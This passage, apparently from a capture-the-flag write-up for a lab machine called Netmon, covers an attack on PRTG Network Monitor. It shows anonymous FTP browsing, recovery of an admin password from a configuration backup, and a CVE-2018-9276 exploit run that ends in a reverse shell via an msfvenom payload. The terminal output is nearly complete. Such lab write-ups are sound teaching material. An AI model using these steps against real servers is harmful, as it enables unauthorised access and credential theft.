+                11-20-16&nbsp;&nbsp;10<span style="color:#ff9d00;font-weight:700">:</span>19PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;USOShared<br>
+                02-25-19&nbsp;&nbsp;10<span style="color:#ff9d00;font-weight:700">:</span>56PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VMware<br>
+                226&nbsp;Transfer&nbsp;complete.
+            </div>
+        </div><br>
+        <br>
+        Paessler is the company that makes PRTG Network Monitor...<br>
+            <div class="codebox">
+                <span style="color:#ff9d00;font-weight:700">ftp</span>&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;Paessler<br>
+                250&nbsp;CWD&nbsp;<span style="color:#ff9d00;font-weight:700">command</span>&nbsp;successful.<br>
+                <span style="color:#ff9d00;font-weight:700">ftp</span>&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-alh<br>
+                200&nbsp;PORT&nbsp;<span style="color:#ff9d00;font-weight:700">command</span>&nbsp;successful.<br>
+                125&nbsp;Data&nbsp;connection&nbsp;already&nbsp;open<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;Transfer&nbsp;starting.<br>
+                05-13-19&nbsp;&nbsp;05<span style="color:#ff9d00;font-weight:700">:</span>43PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PRTG&nbsp;Network&nbsp;Monitor<br>
+                226&nbsp;Transfer&nbsp;complete.<br>
+                <span style="color:#ff9d00;font-weight:700">ftp</span>&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;<span style="color:#3ad900;font-weight:400">"PRTG&nbsp;Network&nbsp;Monitor"</span><br>
+                250&nbsp;CWD&nbsp;<span style="color:#ff9d00;font-weight:700">command</span>&nbsp;successful.<br>
+                <span style="color:#ff9d00;font-weight:700">ftp</span>&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br>
+                200&nbsp;PORT&nbsp;<span style="color:#ff9d00;font-weight:700">command</span>&nbsp;successful.<br>
+                125&nbsp;Data&nbsp;connection&nbsp;already&nbsp;open<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;Transfer&nbsp;starting.<br>
+                02-03-19&nbsp;&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>40AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Configuration&nbsp;Auto-Backups<br>
+                05-13-19&nbsp;&nbsp;05<span style="color:#ff9d00;font-weight:700">:</span>42PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Log&nbsp;Database<br>
+                02-03-19&nbsp;&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>18AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Logs&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Debug<span style="color:#ff9d00;font-weight:700">)</span><br>
+                02-03-19&nbsp;&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>18AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Logs&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Sensors<span style="color:#ff9d00;font-weight:700">)</span><br>
+                02-03-19&nbsp;&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>18AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Logs&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>System<span style="color:#ff9d00;font-weight:700">)</span><br>
+                05-13-19&nbsp;&nbsp;05<span style="color:#ff9d00;font-weight:700">:</span>42PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Logs&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Web&nbsp;Server<span style="color:#ff9d00;font-weight:700">)</span><br>
+                02-25-19&nbsp;&nbsp;08<span style="color:#ff9d00;font-weight:700">:</span>01PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Monitoring&nbsp;Database<br>
+                02-25-19&nbsp;&nbsp;10<span style="color:#ff9d00;font-weight:700">:</span>54PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1189697&nbsp;PRTG&nbsp;Configuration.dat<br>
+                02-25-19&nbsp;&nbsp;10<span style="color:#ff9d00;font-weight:700">:</span>54PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1189697&nbsp;PRTG&nbsp;Configuration.old<br>
+                07-14-18&nbsp;&nbsp;03<span style="color:#ff9d00;font-weight:700">:</span>13AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1153755&nbsp;PRTG&nbsp;Configuration.old.bak<br>
+                05-13-19&nbsp;&nbsp;05<span style="color:#ff9d00;font-weight:700">:</span>43PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1647604&nbsp;PRTG&nbsp;Graph&nbsp;Data&nbsp;Cache.dat<br>
+                02-25-19&nbsp;&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>00PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Report&nbsp;PDFs<br>
+                02-03-19&nbsp;&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>18AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System&nbsp;Information&nbsp;Database<br>
+                02-03-19&nbsp;&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>40AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Ticket&nbsp;Database<br>
+                02-03-19&nbsp;&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>18AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ToDo&nbsp;Database<br>
+                226&nbsp;Transfer&nbsp;complete.
+            </div>
+        </div><br>
+        <br>
+        Googling for “PRTG network monitor password" gave me this link - <a href="https://old.reddit.com/r/sysadmin/comments/835dai/prtg_exposes_domain_accounts_and_passwords_in/">https://old.reddit.com/r/sysadmin/comments/835dai/prtg_exposes_domain_accounts_and_passwords_in/</a> - which provided the information that:<br>
+        - encrypted passowrds are stored in "PRTG Configuration.dat" file<br>
+        - backup copies of this file, in PRTG versions 17.4.35.3326 and later, very likely contain unencrypted passwords<br>
+        <br>
+            <div class="codebox">
+                <span style="color:#ff9d00;font-weight:700">ftp</span>&gt;&nbsp;get&nbsp;<span style="color:#3ad900;font-weight:400">"PRTG&nbsp;Configuration.old.bak"</span><br>
+                local<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;PRTG&nbsp;Configuration.old.bak&nbsp;remote<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;PRTG&nbsp;Configuration.old.bak<br>
+                200&nbsp;PORT&nbsp;<span style="color:#ff9d00;font-weight:700">command</span>&nbsp;successful.<br>
+                125&nbsp;Data&nbsp;connection&nbsp;already&nbsp;open<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;Transfer&nbsp;starting.<br>
+                226&nbsp;Transfer&nbsp;complete.<br>
+                1153755&nbsp;bytes&nbsp;received&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;0.95&nbsp;secs&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>1.1527&nbsp;MB<span style="color:#ff9d00;font-weight:700">/</span>s<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">ftp</span>&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">exit</span>
+            </div>
+        </div><br>
+        <br>
+        Now have a look through the file. I like nano:<br>
+        <code>root@kali:~/ctf/netmon/21ftp# nano “PRTG Configuration.old.bak"</code><br>
+        ctrl+W → search “user" and you'll find:<br>
+            <div class="codebox">
+                prtgadmin<br>
+                PrTg@dmin2018
+            </div>
+        </div><br>
+        <br>
+        Trying these credentials at the http login page gives us nothing.<br>
+        Consider the name of the file - “old".<br>
+        <br>
+        This honestly stumped me a little. I'd actually already considered the answer, but thought that there was no way that could possibly be it so I moved on and tried other things. What made me reconsider was the timestamp at the top of the file:<br>
+        <br>
+            <div class="codebox">
+                &lt;geostat&nbsp;day="02-02-2019"&gt;<br>
+                &lt;geolpV2&gt;<br>
+                &nbsp;&nbsp;1<br>
+                &lt;/geolpV2&gt;<br>
+                &lt;/geostat&gt;<br>
+                &lt;geostat&nbsp;day="03-02-2019"/&gt;
+            </div>
+        </div><br>
+        <br>
+        It's dated 2019.<br>
+        We're looking at an old backup. The current password has 2018 in it...<br>
+        <br>
+        <code>prtgadmin<br>
+        PrTg@dmin2019</code><br>
+        <br>
+        Don't hate yourself, hate the box.<br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) RCE</strong></h2><br>
+        To be honest it seems like google will give you the answer to most of this box, it just requires a fair bit of googling.<br>
+        <br>
+        Googling for a prtg network monitor exploit produced a remote code execution vulnerability, which wouldn't work out of the box for me.<br>
+        <br>
+        Googling about the exploit returned this - <a href="https://github.com/wildkindcc/CVE-2018-9276.git">https://github.com/wildkindcc/CVE-2018-9276.git</a> - which looked promising. It's a rewrite of the original exploit that the author wrote to improve consistency.<br>
+        <br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>netmon<span style="color:#ff9d00;font-weight:700">/</span>exploit#&nbsp;git&nbsp;clone&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>github.com<span style="color:#ff9d00;font-weight:700">/</span>wildkindcc<span style="color:#ff9d00;font-weight:700">/</span>CVE-2018-9276.git<br>
+                Cloning&nbsp;into&nbsp;<span style="color:#3ad900;font-weight:400">'CVE-2018-9276'</span>...<br>
+                remote<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Enumerating&nbsp;objects<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;7,&nbsp;done.<br>
+                remote<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Counting&nbsp;objects<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;100%&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>7<span style="color:#ff9d00;font-weight:700">/</span>7<span style="color:#ff9d00;font-weight:700">)</span>,&nbsp;done.<br>
+                remote<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Compressing&nbsp;objects<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;100%&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>5<span style="color:#ff9d00;font-weight:700">/</span>5<span style="color:#ff9d00;font-weight:700">)</span>,&nbsp;done.<br>
+                remote<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Total&nbsp;7&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>delta&nbsp;0<span style="color:#ff9d00;font-weight:700">)</span>,&nbsp;reused&nbsp;4&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>delta&nbsp;0<span style="color:#ff9d00;font-weight:700">)</span>,&nbsp;pack-reused&nbsp;0<br>
+                Unpacking&nbsp;objects<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;100%&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>7<span style="color:#ff9d00;font-weight:700">/</span>7<span style="color:#ff9d00;font-weight:700">)</span>,&nbsp;done.<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>netmon<span style="color:#ff9d00;font-weight:700">/</span>exploit#&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br>
+                CVE-2018-9276<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>netmon<span style="color:#ff9d00;font-weight:700">/</span>exploit#&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;CVE-2018-9276<span style="color:#ff9d00;font-weight:700">/</span><br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>netmon<span style="color:#ff9d00;font-weight:700">/</span>exploit<span style="color:#ff9d00;font-weight:700">/</span>CVE-2018-9276#&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br>
+                CVE-2018-9276.py&nbsp;&nbsp;README.md<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>netmon<span style="color:#ff9d00;font-weight:700">/</span>exploit<span style="color:#ff9d00;font-weight:700">/</span>CVE-2018-9276#&nbsp;python&nbsp;CVE-2018-9276.py&nbsp;-h<br>
+                usage<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;CVE-2018-9276.py&nbsp;[-h]&nbsp;-i&nbsp;HOST&nbsp;-p&nbsp;PORT&nbsp;--lhost&nbsp;LHOST&nbsp;--lport&nbsp;LPORT<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[--user&nbsp;USER]&nbsp;[--password&nbsp;PASSWORD]&nbsp;[--https]<br>
+                <br>
+                CVE-2018-9276<br>
+                <br>
+                optional&nbsp;arguments<span style="color:#ff9d00;font-weight:700">:</span><br>
+                &nbsp;&nbsp;-h,&nbsp;--help&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;show&nbsp;this&nbsp;<span style="color:#ff9d00;font-weight:700">help</span>&nbsp;message&nbsp;and&nbsp;<span style="color:#ff9d00;font-weight:700">exit</span><br>
+                &nbsp;&nbsp;-i&nbsp;HOST,&nbsp;--host&nbsp;HOST&nbsp;&nbsp;IP&nbsp;address&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;Hostname&nbsp;of&nbsp;vulnerable&nbsp;PRTG&nbsp;server<br>
+                &nbsp;&nbsp;-p&nbsp;PORT,&nbsp;--port&nbsp;PORT&nbsp;&nbsp;Port&nbsp;number<br>
+                &nbsp;&nbsp;--lhost&nbsp;LHOST&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LHOST&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">MSFVENOM</span><br>
+                &nbsp;&nbsp;--lport&nbsp;LPORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LPORT&nbsp;for&nbsp;MSFVENOM<br>
+                &nbsp;&nbsp;--user&nbsp;USER&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Administrator&nbsp;Username<br>
+                &nbsp;&nbsp;--password&nbsp;PASSWORD&nbsp;&nbsp;&nbsp;Administrator&nbsp;Password<br>
+                &nbsp;&nbsp;--https&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Negotiate&nbsp;SSL&nbsp;connection&nbsp;to&nbsp;the&nbsp;server&nbsp;(Requires<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;socket&nbsp;to&nbsp;be&nbsp;compiled&nbsp;with&nbsp;SSL&nbsp;support)
+            </div>
+        </div><br>
+        <br>
+        I modified the exploit to include SMB2 support as (I think) nmap said it was running - just uncomment this line:<br>
+        <code>#server.setSMB2Support(True)</code><br>
+        <br>
+        It worked! I had to try the exploit a few times.<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>netmon<span style="color:#ff9d00;font-weight:700">/</span>exploit<span style="color:#ff9d00;font-weight:700">/</span>CVE-2018-9276#&nbsp;<span style="color:#ff9d00;font-weight:700">cp</span>&nbsp;CVE-2018-9276.py&nbsp;wildkind.py<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>netmon<span style="color:#ff9d00;font-weight:700">/</span>exploit<span style="color:#ff9d00;font-weight:700">/</span>CVE-2018-9276#&nbsp;nano&nbsp;wildkind.py<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>netmon<span style="color:#ff9d00;font-weight:700">/</span>exploit<span style="color:#ff9d00;font-weight:700">/</span>CVE-2018-9276#&nbsp;python&nbsp;wildkind.py&nbsp;-i&nbsp;10.10.10.152&nbsp;-p&nbsp;80&nbsp;--lhost&nbsp;10.10.13.83&nbsp;--lport&nbsp;4441&nbsp;--user&nbsp;prtgadmin&nbsp;--password&nbsp;PrTg@dmin2019<br>
+                [+]&nbsp;[PRTG<span style="color:#ff9d00;font-weight:700">/</span>18.1.37.13946]&nbsp;is&nbsp;Vulnerable<span style="color:#ff9d00;font-weight:700">!</span><br>
+                <br>
+                [*]&nbsp;Exploiting&nbsp;[10.10.10.152<span style="color:#ff9d00;font-weight:700">:</span>80]&nbsp;as&nbsp;[prtgadmin<span style="color:#ff9d00;font-weight:700">/</span>PrTg@dmin2019]<br>
+                [+]&nbsp;Session&nbsp;obtained&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;[<span style="color:#7f0044;font-weight:400">prtgadmin</span>:PrTg@dmin2019]<br>
+                [+]&nbsp;File&nbsp;staged&nbsp;at&nbsp;[C:\Users\Public\tester.txt]&nbsp;successfully&nbsp;with&nbsp;objid&nbsp;of&nbsp;[2030]<br>
+                [+]&nbsp;Session&nbsp;obtained&nbsp;for&nbsp;[prtgadmin:PrTg@dmin2019]<br>
+                [+]&nbsp;Notification&nbsp;with&nbsp;objid&nbsp;[2030]&nbsp;staged&nbsp;for&nbsp;execution<br>
+                [*]&nbsp;Generate&nbsp;msfvenom&nbsp;payload&nbsp;with&nbsp;[LHOST=10.10.13.83&nbsp;LPORT=4441&nbsp;OUTPUT=/tmp/xsleeuxc.dll]<br>
+                [-]&nbsp;No&nbsp;platform&nbsp;was&nbsp;selected,&nbsp;choosing&nbsp;Msf::Module::Platform::Windows&nbsp;from&nbsp;the&nbsp;payload<br>
+                [-]&nbsp;No&nbsp;arch&nbsp;selected,&nbsp;selecting&nbsp;arch:&nbsp;x86&nbsp;from&nbsp;the&nbsp;payload<br>
+                No&nbsp;encoder&nbsp;or&nbsp;badchars&nbsp;specified,&nbsp;outputting&nbsp;raw&nbsp;payload<br>
+                Payload&nbsp;size:&nbsp;324&nbsp;bytes<br>
+                Final&nbsp;size&nbsp;of&nbsp;dll&nbsp;file:&nbsp;5120&nbsp;bytes<br>
+                [*]&nbsp;Config&nbsp;file&nbsp;parsed<br>
+                [*]&nbsp;Callback&nbsp;added&nbsp;for&nbsp;UUID&nbsp;4B324FC8-1670-01D3-1278-5A47BF6EE188&nbsp;V:3.0<br>
+                [*]&nbsp;Callback&nbsp;added&nbsp;for&nbsp;UUID&nbsp;6BFFD098-A112-3610-9833-46C3F87E345A&nbsp;V:1.0<br>
+                [*]&nbsp;Config&nbsp;file&nbsp;parsed<br>
+                [*]&nbsp;Config&nbsp;file&nbsp;parsed<br>
+                [*]&nbsp;Hosting&nbsp;payload&nbsp;at&nbsp;[\\10.10.13.83\BYBUEMCX]<br>
+                [+]&nbsp;Session&nbsp;obtained&nbsp;for&nbsp;[prtgadmin:PrTg@dmin2019]<br>
+                [+]&nbsp;Command&nbsp;staged&nbsp;at&nbsp;[C:\Users\Public\tester.txt]&nbsp;successfully&nbsp;with&nbsp;objid&nbsp;of&nbsp;[2031]<br>
+                [+]&nbsp;Session&nbsp;obtained&nbsp;for&nbsp;[prtgadmin:PrTg@dmin2019]<br>
+                [+]&nbsp;Notification&nbsp;with&nbsp;objid&nbsp;[2031]&nbsp;staged&nbsp;for&nbsp;execution<br>
+                [*]&nbsp;Attempting&nbsp;to&nbsp;kill&nbsp;the&nbsp;impacket&nbsp;thread<br>
+                [-]&nbsp;Impacket&nbsp;will&nbsp;maintain&nbsp;its&nbsp;own&nbsp;thread&nbsp;for&nbsp;active&nbsp;connections,&nbsp;so&nbsp;you&nbsp;may&nbsp;find&nbsp;it's&nbsp;still&nbsp;listening&nbsp;on&nbsp;&lt;LHOST&gt;:445!<br>
+                [-]&nbsp;ps&nbsp;aux&nbsp;|&nbsp;grep&nbsp;&lt;script&nbsp;name&gt;&nbsp;and&nbsp;kill&nbsp;-9&nbsp;&lt;pid&gt;&nbsp;if&nbsp;it&nbsp;is&nbsp;still&nbsp;running&nbsp;:)<br>
+                [-]&nbsp;The&nbsp;connection&nbsp;will&nbsp;eventually&nbsp;time&nbsp;out.<br>
+                <br>
+                [+]&nbsp;Listening&nbsp;on&nbsp;[10.10.13.83:4441&nbsp;for&nbsp;the&nbsp;reverse&nbsp;shell!]<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;4441&nbsp;...<br>
+                [*]&nbsp;Incoming&nbsp;connection&nbsp;(10.10.10.152,54603)<br>
+                [*]&nbsp;SMB2_NEGOTIATE:&nbsp;SMB2&nbsp;not&nbsp;supported,&nbsp;fallbacking<br>
+                [*]&nbsp;AUTHENTICATE_MESSAGE&nbsp;(\,NETMON)<br>
+                [*]&nbsp;User&nbsp;\NETMON&nbsp;authenticated&nbsp;successfully<br>
+                [*]&nbsp;:::00::4141414141414141<br>
+                connect&nbsp;to&nbsp;[10.10.13.83]&nbsp;from&nbsp;(UNKNOWN)&nbsp;[10.10.10.152]&nbsp;54608<br>
+                Microsoft&nbsp;Windows&nbsp;[Version&nbsp;10.0.14393]<br>
+                (c)&nbsp;2016&nbsp;Microsoft&nbsp;Corporation.&nbsp;All&nbsp;rights&nbsp;reserved.<br>
+                <br>
+                C:\Windows\system32&gt;systeminfo<br>
+                systeminfo<br>
+                <br>
+                Host&nbsp;Name:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NETMON<br>
+                OS&nbsp;Name:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;Server&nbsp;2016&nbsp;Standard<br>
+                OS&nbsp;Version:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10.0.14393&nbsp;N/A&nbsp;Build&nbsp;14393<br>
+                OS&nbsp;Manufacturer:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Corporation<br>
+                OS&nbsp;Configuration:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Standalone&nbsp;Server<br>
+                OS&nbsp;Build&nbsp;Type:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Multiprocessor&nbsp;Free<br>
+                Registered&nbsp;Owner:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Windows&nbsp;User<br>
+                Registered&nbsp;Organization:&nbsp;&nbsp;&nbsp;<br>
+                Product&nbsp;ID:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;00376-30821-30176-AA362<br>
+                Original&nbsp;Install&nbsp;Date:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2/3/2019,&nbsp;7:05:45&nbsp;AM<br>
+                System&nbsp;Boot&nbsp;Time:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5/14/2019,&nbsp;4:34:05&nbsp;AM<br>
+                System&nbsp;Manufacturer:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VMware,&nbsp;Inc.<br>
+                System&nbsp;Model:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VMware&nbsp;Virtual&nbsp;Platform<br>
+                System&nbsp;Type:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x64-based&nbsp;PC<br>
+                Processor(s):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1&nbsp;Processor(s)&nbsp;Installed.<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[01]:&nbsp;Intel64&nbsp;Family&nbsp;6&nbsp;Model&nbsp;79&nbsp;Stepping&nbsp;1&nbsp;GenuineIntel&nbsp;~2100&nbsp;Mhz<br>
+                BIOS&nbsp;Version:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Phoenix&nbsp;Technologies&nbsp;LTD&nbsp;6.00,&nbsp;4/5/2016<br>
+                Windows&nbsp;Directory:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows<br>
+                System&nbsp;Directory:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\system32<br>
+                Boot&nbsp;Device:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\Device\HarddiskVolume1<br>
